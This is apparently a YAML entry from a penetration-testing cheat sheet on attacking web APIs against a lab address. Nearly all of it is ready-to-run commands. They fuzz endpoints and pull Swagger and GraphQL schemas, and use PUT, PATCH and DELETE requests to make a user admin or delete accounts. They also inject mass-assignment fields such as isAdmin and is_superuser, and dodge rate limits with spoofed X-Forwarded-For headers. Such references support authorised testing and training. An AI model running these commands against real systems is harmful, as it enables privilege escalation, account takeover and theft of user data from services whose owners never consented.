---
description: |
  API security testing — enumerate endpoints, test HTTP methods, exploit mass assignment, and discover hidden API documentation.
command: |
  # Enumerate API endpoints
  # Fuzz API paths with ffuf
  ffuf -u http://10.10.10.27/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

  # Gobuster
  gobuster dir -u http://10.10.10.27/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

  # Fuzz with authentication
  ffuf -u http://10.10.10.27/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H "Authorization: Bearer TOKEN"

  # REST API common paths — check for documentation and endpoints
  curl -s http://10.10.10.27/swagger.json
  curl -s http://10.10.10.27/openapi.json
  curl -s http://10.10.10.27/api-docs
  curl -s http://10.10.10.27/api/swagger.json
  curl -s http://10.10.10.27/api/v1/
  curl -s http://10.10.10.27/api/v2/
  curl -s http://10.10.10.27/api/users
  curl -s http://10.10.10.27/api/admin
  curl -s http://10.10.10.27/.well-known/openapi.json

  # Test HTTP methods — check what methods are allowed
  # OPTIONS request to discover allowed methods
  curl -X OPTIONS http://10.10.10.27/api/users -v

  # Test PUT method
  curl -X PUT http://10.10.10.27/api/users/1 -H "Content-Type: application/json" -d '{"role":"admin"}'

  # Test DELETE method
  curl -X DELETE http://10.10.10.27/api/users/2

  # Test PATCH method
  curl -X PATCH http://10.10.10.27/api/users/1 -H "Content-Type: application/json" -d '{"email":"pwned@senshu.sh"}'

  # Mass assignment — add unexpected parameters
  # Register endpoint — add admin field
  curl -X POST http://10.10.10.27/api/register -H "Content-Type: application/json" \
    -d '{"username":"sec_user","password":"P@ssw0rd","admin":true}'

  # Profile update — add role field
  curl -X PUT http://10.10.10.27/api/profile -H "Content-Type: application/json" \
    -d '{"email":"sec_user@senshu.sh","role":"admin","isAdmin":true,"is_superuser":1}'

  # Rate limiting bypass
  # Add headers to bypass rate limiting
  curl -X POST http://10.10.10.27/api/login -H "X-Forwarded-For: 127.0.0.1" \
    -H "Content-Type: application/json" -d '{"username":"sec_user","password":"P@ssw0rd"}'

  # Rotate X-Forwarded-For IPs
  curl -H "X-Originating-IP: 127.0.0.1" http://10.10.10.27/api/login
  curl -H "X-Remote-IP: 127.0.0.1" http://10.10.10.27/api/login
  curl -H "X-Real-IP: 127.0.0.1" http://10.10.10.27/api/login

  # API versioning — test older versions for missing security controls
  # v2 might have auth, but v1 might not
  curl -s http://10.10.10.27/api/v1/users
  curl -s http://10.10.10.27/api/v2/users
  curl -s http://10.10.10.27/api/v3/users

  # GraphQL introspection query
  # Full introspection query
  curl -X POST http://10.10.10.27/graphql -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}'

  # Simple introspection
  curl -X POST http://10.10.10.27/graphql -H "Content-Type: application/json" \
    -d '{"query":"{__schema{queryType{name},mutationType{name},types{name}}}"}'

  # Query all users (example)
  curl -X POST http://10.10.10.27/graphql -H "Content-Type: application/json" \
    -d '{"query":"{users{id,username,email,role}}"}'
items:
  - No_Creds
  - Credentials
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - API_Testing
references:
  - https://owasp.org/API-Security/
  - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/web-api-pentesting.html
---
